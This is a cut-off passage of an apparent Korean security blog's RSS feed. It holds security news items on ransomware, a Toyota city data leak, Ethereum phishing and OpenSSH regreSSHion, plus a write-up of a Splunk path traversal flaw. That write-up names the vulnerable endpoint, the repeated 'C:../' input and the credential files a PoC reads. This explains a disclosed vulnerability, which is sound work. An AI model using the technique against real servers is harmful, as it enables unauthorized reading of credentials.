&#xC785;&#xD614;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>RaaS&#xB294; &#xB0AE;&#xC740; &#xC9C4;&#xC785; &#xC7A5;&#xBCBD;&#xACFC; &#xC218;&#xC775; &#xACF5;&#xC720; &#xBAA8;&#xB378; &#xB355;&#xBD84;&#xC5D0; &#xC0AC;&#xC774;&#xBC84; &#xBC94;&#xC8C4;&#xB97C; &#xCD09;&#xC9C4;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788;, &#xBC94;&#xC8C4;&#xC790;&#xB4E4;&#xC774; &#xAE30;&#xC220;&#xC801; &#xC9C0;&#xC2DD; &#xC5C6;&#xC774;&#xB3C4; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC5B4;, &#xC0AC;&#xC774;&#xBC84; &#xACF5;&#xACA9;&#xC758; &#xBE48;&#xB3C4;&#xAC00; &#xC99D;&#xAC00;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. RaaS&#xB294; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4; &#xACF5;&#xACA9;&#xC744; &#xB354; &#xC870;&#xC9C1;&#xC801;&#xC774;&#xACE0; &#xD6A8;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD558;&#xC5EC;, &#xAE30;&#xC5C5;&#xACFC; &#xAC1C;&#xC778;&#xC5D0;&#xAC8C; &#xD070; &#xC704;&#xD611;&#xC774; &#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Newsletter/">Newsletter</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/newsletter/">newsletter</category>
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      
      <comments>https://hackyboiz.github.io/2024/07/15/romi0x/newsletter0715/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-36991 : Splunk Enterprise의 Path Traversal로 인한 임의 파일 읽기 취약점</title>
      <link>https://hackyboiz.github.io/2024/07/10/pwndorei/2024-07-10/</link>
      <guid>https://hackyboiz.github.io/2024/07/10/pwndorei/2024-07-10/</guid>
      <pubDate>Wed, 10 Jul 2024 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://cn-sec.com/archives/2928066.html&quot;&gt;https://cn-sec.</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://cn-sec.com/archives/2928066.html">https://cn-sec.com/archives/2928066.html</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Splunk Enterprise for Windows<ul><li>9.2.0 ~ 9.2.1</li><li>9.1.0 ~ 9.1.4</li><li>9.0.0 ~ 9.0.9</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Splunk Enterpirse&#xB294; &#xB370;&#xC774;&#xD130; &#xBD84;&#xC11D; &#xD50C;&#xB7AB;&#xD3FC;&#xC73C;&#xB85C; &#xC11C;&#xBC84; &#xB4F1;&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xB418;&#xB294; &#xBAA8;&#xB4E0; &#xB85C;&#xADF8;&#xC640; &#xC774;&#xBCA4;&#xD2B8; &#xB4F1;&#xC744; &#xC218;&#xC9D1; &#xBC0F; &#xC800;&#xC7A5;, &#xC774;&#xB97C; &#xD1B5;&#xD55C; &#xBD84;&#xC11D;&#xACFC; &#xC2DC;&#xAC01;&#xD654;&#xAE4C;&#xC9C0; &#xAC00;&#xB2A5;&#xD55C; &#xC194;&#xB8E8;&#xC158;&#xC785;&#xB2C8;&#xB2E4;. &#xBCF4;&#xC548;&#xC744; &#xBE44;&#xB86F;&#xD558;&#xC5EC; &#xC6B4;&#xC601;&#xACFC; &#xBE44;&#xC988;&#xB2C8;&#xC2A4; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xD3ED;&#xB113;&#xAC8C; &#xD65C;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xACE0; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xC6F9;&#xAE30;&#xBC18; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC778; Splunk Web&#xC744; &#xD1B5;&#xD574; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBC88;&#xC5D0; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC774; Splunk Web&#xC758; <code>/modules/messaging/</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xB85C; &#xD0D0;&#xC0C9; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p><code>/modules/messaging/[&#xD30C;&#xC77C;&#xACBD;&#xB85C;]</code>&#xACFC; &#xAC19;&#xC740; &#xACBD;&#xB85C;&#xB85C; GET &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; &#xC751;&#xB2F5;&#xC73C;&#xB85C;&#xB294; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xD3F4;&#xB354;&#xC758; &#xACBD;&#xB85C;&#xC640; GET &#xC694;&#xCCAD;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xAC00; python&#xC758; <code>os.path.join</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; join&#xB418;&#xC5C8;&#xACE0; Windows&#xC5D0;&#xC11C;&#xB294; <code>join</code> &#xD568;&#xC218;&#xB85C; &#xC778;&#xD574; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xC911;&#xBCF5;&#xB418;&#xB294; &#xAC19;&#xC740; &#xB4DC;&#xB77C;&#xC774;&#xBE0C; &#xBB38;&#xC790;&#xB294; &#xC5C6;&#xC5B4;&#xC9C0;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/07/10/pwndorei/2024-07-10/Untitled.png" alt="Untitled"></p><p>&#xB610;&#xD55C; &#xD30C;&#xC77C; &#xD0D0;&#xC0C9;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xD3F4;&#xB354;&#xB294; <code>C:\Program Files\Splunk</code>&#xC5D0;  &#xC704;&#xCE58;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC704; &#xAE30;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74; <code>C:\Program Files\Splunk\etc\passwd</code> &#xCC98;&#xB7FC; &#xBBFC;&#xAC10;&#xD55C; &#xB0B4;&#xC6A9;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xC77D;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xC758; poc&#xC5D0;&#xC11C;&#xB294; <code>C:\Program Files\Splunk\etc\passwd</code>&#xC640; <code>C:\Windows\win.ini</code> &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/07/10/pwndorei/2024-07-10/Untitled%201.png" alt="Untitled"></p><p><img src="/2024/07/10/pwndorei/2024-07-10/Untitled%202.png" alt="Untitled"></p><p>&#xB610;&#xD55C; poc&#xC5D0;&#xC11C; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; <code>C:../</code> &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xC4F0;&#xC778; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC544; <code>/modules/messaging</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; <code>join</code> &#xD568;&#xC218;&#xB97C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC0AC;&#xC6A9;&#xD588;&#xC744; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/07/10/pwndorei/2024-07-10/Untitled%203.png" alt="Untitled"></p><p>&#xC774;&#xB7EC;&#xD55C; <code>join</code>&#xD568;&#xC218;&#xC758; &#xB3D9;&#xC791;&#xC740; &#xC624;&#xC9C1; Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB9CC; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCDE8;&#xC57D;&#xC810; &#xB610;&#xD55C; Windows&#xC6A9; Splunk Enterprise&#xC5D0;&#xC11C;&#xB9CC; &#xBC1C;&#xC0DD;&#xD55C;&#xB2E4;&#xB294; &#xD2B9;&#xC9D5;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/Splunk/">Splunk</category>
      
      
      <comments>https://hackyboiz.github.io/2024/07/10/pwndorei/2024-07-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해킹짹짹🐣] 일본 도요타시, 도시 인구 전체인 42만 명의 개인 정보 유출</title>
      <link>https://hackyboiz.github.io/2024/07/08/hunjison/newsletter0708/</link>
      <guid>https://hackyboiz.github.io/2024/07/08/hunjison/newsletter0708/</guid>
      <pubDate>Mon, 08 Jul 2024 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, &amp;#xC694;&amp;#xC0C8; &amp;#xD574;&amp;#xD0B9;&amp;#xC774; &amp;#xC798; &amp;#xB418;&amp;#xC5B4; &amp;#xAE30;&amp;#xBD84; &amp;#xC88B;&amp;#</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, &#xC694;&#xC0C8; &#xD574;&#xD0B9;&#xC774; &#xC798; &#xB418;&#xC5B4; &#xAE30;&#xBD84; &#xC88B;&#xC740; hunjison &#xC785;&#xB2C8;&#xB2E4; &#x1F61A;</p><p>&#xC774;&#xBC88; &#xC8FC;&#xC5D0;&#xB294; &#xB3C4;&#xC694;&#xD0C0;&#xC2DC; &#xC804;&#xCCB4; &#xC778;&#xAD6C;&#xC758; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xAC00; &#xC720;&#xCD9C;&#xB418;&#xB294; &#xB9D0;&#xB3C4; &#xC548;&#xB418;&#xB294;.. &#xC0AC;&#xAC74;&#xB3C4; &#xC788;&#xC5C8;&#xACE0;,</p><p>&#xC0C8;&#xB85C;&#xC6B4; OpenSSH RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xB294; &#xB4F1; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xAE30;&#xC0AC;&#xB3C4; &#xB9CE;&#xC558;&#xC5B4;&#xC694;!</p><h2 id="&#xC774;&#xBC88;-&#xC8FC;-&#xC9F9;&#xC9F9;-PICK&#x1F425;"><a href="#&#xC774;&#xBC88;-&#xC8FC;-&#xC9F9;&#xC9F9;-PICK&#x1F425;" class="headerlink" title="&#xC774;&#xBC88; &#xC8FC; &#xC9F9;&#xC9F9; PICK&#x1F425;"></a>&#xC774;&#xBC88; &#xC8FC; &#xC9F9;&#xC9F9; PICK&#x1F425;</h2><blockquote><p>&#x26A0;&#xFE0F; <strong>&#xC77C;&#xBCF8; &#xB3C4;&#xC694;&#xD0C0;&#xC2DC;, &#xB3C4;&#xC2DC; &#xC778;&#xAD6C; &#xC804;&#xCCB4;&#xC778; 42&#xB9CC; &#xBA85;&#xC758; &#xAC1C;&#xC778; &#xC815;&#xBCF4; &#xC720;&#xCD9C;</strong></p></blockquote><p>2024.07.05 | &#xBCF4;&#xC548;&#xB274;&#xC2A4; | <a href="https://m.boannews.com/html/detail.html?tab_type=1&amp;idx=131137">&#xAE30;&#xC0AC;&#xBCF4;&#xAE30;</a></p><p><img src="/2024/07/08/hunjison/newsletter0708/image01.png" alt="&#xAE30;&#xC0AC;&#xC0AC;&#xC9C4;"></p><p>&#xC77C;&#xBCF8; &#xB3C4;&#xC694;&#xD0C0;&#xC2DC;&#xC5D0;&#xC11C; <strong>&#xC2DC;&#xBBFC; &#xC804;&#xCCB4; &#xC778;&#xAD6C;&#xC778; 42&#xB9CC; &#xBA85;&#xC758; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xAC00; &#xC720;&#xCD9C;</strong>&#xB418;&#xB294; &#xC0AC;&#xACE0;&#xAC00; &#xBC1C;&#xC0DD;&#xD588;&#xC5B4;&#xC694; &#x1F605;&#x1F605;</p><p>&#xD1B5;&#xC9C0;&#xC11C; &#xB4F1;&#xC758; &#xC791;&#xC131;&#xC744; &#xC704;&#xD0C1;&#xD558;&#xB294; &#x2018;&#xC774;&#xC138;&#xD1A0;&#x2019;&#xB77C;&#xB294; &#xD68C;&#xC0AC;&#xAC00; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xC5D0; &#xAC10;&#xC5FC;&#xB418;&#xC5B4; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xAC00; &#xC720;&#xCD9C;&#xB41C; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xD558;&#xB294;&#xB370;&#xC694;. &#xC774;&#xC138;&#xD1A0; &#xD68C;&#xC0AC;&#xC5D0;&#xC11C;&#xB294; &#xACC4;&#xC57D;&#xC774; &#xC885;&#xB8CC;&#xB418;&#xB294; &#xC2DC;&#xC810;&#xC5D0; &#xC0AD;&#xC81C;&#xD574;&#xC57C; &#xD560; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD55C; &#xCC44;&#xB85C; &#xB450;&#xACE0; &#xC788;&#xB2E4;&#xAC00; &#xC11C;&#xBC84;&#xAC00; &#xACF5;&#xACA9;&#xC744; &#xB2F9;&#xD588;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBC88; &#xC0AC;&#xAC74;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xB3C4;&#xC694;&#xD0C0; &#xC804;&#xCCB4; &#xC2DC;&#xBBFC;&#xC758; &#xC774;&#xB984;, &#xC8FC;&#xC18C;, &#xC138;&#xC561;, &#xACC4;&#xC88C; &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xAC00; &#xC720;&#xCD9C;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD558;&#xB2C8; &#xC815;&#xB9D0; &#xB054;&#xCC0D;&#xD558;&#xB124;&#xC694;. &#x2018;&#xC774;&#xC138;&#xD1A0;&#x2018;&#xC5D0; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xB97C; &#xC704;&#xD0C1;&#xD55C; &#xC9C0;&#xC790;&#xCCB4;&#xB294; &#xB3C4;&#xC694;&#xD0C0;&#xC2DC; &#xBFD0;&#xC774; &#xC544;&#xB2C8;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xB3C4;&#xCFE0;&#xC2DC;&#xB9C8;&#xD604;&#xC5D0;&#xC11C; &#xC57D; 20&#xB9CC; &#xAC74;&#xC758; &#xC790;&#xB3D9;&#xCC28; &#xB0A9;&#xC138;&#xC790; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xAC00;, &#xC640;&#xCE74;&#xC57C;&#xB9C8;&#xC2DC;&#xB3C4; 15&#xB9CC; &#xAC74;&#xC758; &#xC8FC;&#xBBFC;&#xC138; &#xB300;&#xC0C1;&#xC790; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xAC00; &#xC720;&#xCD9C;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p> &#xCD5C;&#xADFC; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4; &#xC870;&#xC9C1;&#xB4E4;&#xC774; &#xC9C0;&#xC790;&#xCCB4;&#xB97C; &#xD0C0;&#xAC8C;&#xD305;&#xD574; &#xACF5;&#xACA9;&#xD558;&#xB294; &#xC0AC;&#xB840;&#xAC00; &#xC99D;&#xAC00;&#xD558;&#xACE0; &#xC788;&#xC5B4;, <strong>&#xC704;&#xD0C1; &#xAE30;&#xC5C5;&#xC5D0; &#xB300;&#xD55C; &#xBCF4;&#xC548; &#xC194;&#xB8E8;&#xC158; &#xB3C4;&#xC785;&#xACFC; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xAD00;&#xB9AC; &#xCCB4;&#xACC4; &#xC810;&#xAC80;</strong>&#xC5D0; &#xB354; &#xB9CE;&#xC740; &#xAD00;&#xC2EC;&#xC744; &#xAC00;&#xC838;&#xC57C; &#xD560; &#xAC83; &#xAC19;&#xB124;&#xC694; &#x1F62F;</p><h2 id><a href="#" class="headerlink" title=" "></a> </h2><blockquote><p>&#x26A0;&#xFE0F; <strong>&#xC774;&#xB354;&#xB9AC;&#xC6C0; &#xC7AC;&#xB2E8; &#xACF5;&#xC2DD; &#xC774;&#xBA54;&#xC77C;&#xB85C; &#xD53C;&#xC2F1; &#xBA54;&#xC77C;&#xC774; &#x2026;?</strong></p></blockquote><p>2024.07.02 | Ethereum foundation blog | <a href="https://blog.ethereum.org/2024/07/02/blog-incident">&#xBE14;&#xB85C;&#xADF8;</a> | <a href="https://x.com/TimBeiko/status/1804721462407725441">&#xD2B8;&#xC704;&#xD130;</a></p><p><img src="/2024/07/08/hunjison/newsletter0708/image02.png" alt="&#xAE30;&#xC0AC;&#xC0AC;&#xC9C4;"></p><p>&#xC774;&#xB354;&#xB9AC;&#xC6C0; &#xC7AC;&#xB2E8;(Ethereum Foundation) &#xACF5;&#xC2DD; &#xBE14;&#xB85C;&#xADF8; &#xACC4;&#xC815;&#xC5D0;&#xC11C; &#xD53C;&#xC2F1; &#xBA54;&#xC77C;&#xC774; &#xBC1C;&#xC1A1;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694;!</p><p>&#xC9C0;&#xB09C; 6&#xC6D4; 23&#xC77C; <code>updates@blog.ethereum.org</code> &#xACC4;&#xC815;&#xC5D0;&#xC11C; &#xC704; &#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC774; &#xAC70;&#xC9D3; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; &#xD53C;&#xC2F1; &#xBA54;&#xC77C;&#xC774; 35,794&#xAC1C;&#xC758; &#xC774;&#xBA54;&#xC77C; &#xC8FC;&#xC18C;&#xB85C; &#xBC1C;&#xC1A1;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD558;&#xB294;&#xB370;&#xC694;. &#xD574;&#xB2F9; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; &#xC9C0;&#xAC11;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xAC70;&#xB798;&#xC5D0; &#xC11C;&#xBA85;&#xD558;&#xBA74;, <a href="#&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C;-&#xBB3C;&#xC5B4;&#xBD10;">&#xD06C;&#xB9BD;&#xD1A0; &#xB4DC;&#xB808;&#xC774;&#xB108;(Crypto Drainer)</a>&#xAC00; &#xB3D9;&#xC791;&#xD574; &#xC9C0;&#xAC11;&#xC5D0; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xB3C8;&#xC774; &#xBE60;&#xC838;&#xB098;&#xAC04;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694; &#x1F628;&#x1F62B; &#xD574;&#xB2F9; &#xD53C;&#xC2F1; &#xC0AC;&#xC774;&#xD2B8;&#xB294; &#xC2E4;&#xC81C;&#xB85C; &#xB9E4;&#xC6B0; &#xC815;&#xAD50;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC838; &#xC788;&#xC5C8;&#xB2E4;&#xACE0; &#xD574;&#xC694;!</p><p>&#xC774;&#xB354;&#xB9AC;&#xC6C0; &#xC7AC;&#xB2E8;&#xC740; SendPulse&#xB77C;&#xB294; <strong>&#xC774;&#xBA54;&#xC77C; &#xC11C;&#xBE44;&#xC2A4; &#xC81C;&#xACF5; &#xC5C5;&#xCCB4;</strong>&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xBA54;&#xC77C;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xC600;&#xB294;&#xB370;&#xC694;. &#xD574;&#xB2F9; &#xACC4;&#xC815;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xB370;&#xC5D0;&#xB294; Google Workspace &#xACC4;&#xC815;&#xC744; &#xC774;&#xC6A9;&#xD588;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xC720;&#xCD9C;&#xB41C; Google Workspace &#xACC4;&#xC815;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; SendPulse &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xD589;&#xD788;&#xB3C4; &#xC774;&#xB354;&#xB9AC;&#xC6C0; &#xC7AC;&#xB2E8;&#xC740; &#xACF5;&#xACA9; &#xC815;&#xD669;&#xC744; &#xBC1C;&#xACAC;&#xD558;&#xC790;&#xB9C8;&#xC790; &#xACF5;&#xACA9;&#xC790;&#xB97C; &#xCD94;&#xC801;&#xD588;&#xACE0;, SNS&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xB9C1;&#xD06C;&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xC9C0; &#xB9D0;&#xB77C;&#xACE0; &#xC548;&#xB0B4;&#xD558;&#xB294; &#xB4F1; &#xC801;&#xC808;&#xD55C; &#xC870;&#xCE58;&#xB97C; &#xCDE8;&#xD588;&#xC5B4;&#xC694;. &#xB610;&#xD55C; &#xD574;&#xB2F9; &#xD53C;&#xC2F1; &#xB9C1;&#xD06C;&#xAC00; &#xCC28;&#xB2E8;&#xB420; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xB2E4;&#xC218;&#xC758; Web3 &#xC9C0;&#xAC11; &#xACF5;&#xAE09;&#xC790;&#xC640; Cloudflare &#xB4F1; &#xC5EC;&#xB7EC; &#xC0AC;&#xC774;&#xD2B8;&#xC5D0; &#xD574;&#xB2F9; &#xB9C1;&#xD06C;&#xB97C; &#xC81C;&#xCD9C;&#xD588;&#xB2E4;&#xACE0; &#xD574;&#xC694;. <a href="#&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C;-&#xBB3C;&#xC5B4;&#xBD10;">&#xC628;&#xCCB4;&#xC778;(On-Chain)</a> &#xB370;&#xC774;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD55C; &#xACB0;&#xACFC; &#xB2E4;&#xD589;&#xD788; &#xB204;&#xAD6C;&#xB3C4; &#xD53C;&#xC2F1;&#xC5D0; &#xC18D;&#xC544; &#xB3C8;&#xC744; &#xC783;&#xC9C0; &#xC54A;&#xC740; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC778;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;! &#x1F44C;</p><p>&#xBA54;&#xC77C;&#xB9C1; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xACC4;&#xC815; &#xC815;&#xBCF4;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xD53C;&#xC2F1; &#xACF5;&#xACA9;&#xC744; &#xD558;&#xB294; &#xC0AC;&#xB840;&#xB294; &#xCC98;&#xC74C; &#xB4E4;&#xC5B4;&#xBCF4;&#xC544; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xAE30;&#xC0AC;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4; &#x1F43E;</p><h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h2><blockquote><p>&#x26A0;&#xFE0F; <strong>OpenSSH &#xC11C;&#xBC84;(sshd)&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(RCE) &#xCDE8;&#xC57D;&#xC810; &#xBC1C;&#xACAC;</strong></p></blockquote><p>2024.07.01 | thehackernews | <a href="https://thehackernews.com/2024/07/new-openssh-vulnerability-could-lead-to.html">&#xAE30;&#xC0AC;&#xBCF4;&#xAE30;</a></p><p><img src="/2024/07/08/hunjison/newsletter0708/image03.png" alt="&#xAE30;&#xC0AC;&#xC0AC;&#xC9C4;"></p><p>&#xB9AC;&#xB205;&#xC2A4; &#xC2DC;&#xC2A4;&#xD15C; <a href="#&#xC9F9;&#xC9F9;&#xC774;&#xC5D0;&#xAC8C;-&#xBB3C;&#xC5B4;&#xBD10;">OpenSSH</a> &#xC11C;&#xBC84;(sshd)&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(Remote Code Execution) &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xD654;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;!</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; regreSSHion&#xC774;&#xB77C;&#xB294; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xBC1C;&#xD45C;&#xB418;&#xC5C8;&#xACE0;, CVE-2024-6387&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694;. &#xC774;&#xB7EC;&#xD55C; &#xC774;&#xB984;&#xC774; &#xBD99;&#xC740; &#xC774;&#xC720;&#xB294; <strong>&#xC774;&#xBBF8; &#xBCF4;&#xACE0;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD68C;&#xADC0;(regression)</strong>&#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xB77C;&#xACE0; &#xD558;&#xB124;&#xC694; &#x1F640;&#x1F640;</p><p>2006&#xB144;&#xC5D0; &#xB3D9;&#xC77C;&#xD55C; &#xCDE8;&#xC57D;&#xC810;(CVE-2006-5051)&#xC774; &#xBCF4;&#xACE0;&#xB418;&#xC5B4; &#xC774;&#xBBF8; &#xC218;&#xC815;&#xD588;&#xC5C8;&#xB294;&#xB370;, &#xC774;&#xD6C4; &#xC5B4;&#xB5A0;&#xD55C; &#xC774;&#xC720;&#xB85C; &#xB2E4;&#xC2DC; &#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC;&#xAC00; &#xB4F1;&#xC7A5;&#xD588;&#xB2E4;&#xACE0; &#xD574;&#xC694;. &#xD68C;&#xADC0; &#xC2DC;&#xC810;&#xC740; 2020&#xB144; 10&#xC6D4;(OpenSSH 8.5p1)&#xB85C; &#xC54C;&#xB824;&#xC838; &#xD574;&#xB2F9; &#xBC84;&#xC804; &#xC774;&#xD6C4;&#xC758; &#xBC84;&#xC804;&#xC740; &#xBAA8;&#xB450; &#xCDE8;&#xC57D;&#xD558;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xAE30;&#xC874; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xD14C;&#xC2A4;&#xD2B8;&#xAC00; &#xC55E;&#xC73C;&#xB85C;&#xB294; &#xAF2D; &#xD544;&#xC694;&#xD560; &#xAC83; &#xAC19;&#xB124;&#xC694;! &#xC774;&#xBBF8; &#xD328;&#xCE58;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xB3C4; &#xB2E4;&#xC2DC; &#xBCF4;&#xC544;&#xC57C;&#xACA0;&#xC5B4;&#xC694; &#x1F601;</p><h2 id="-2"><a href="#-2" 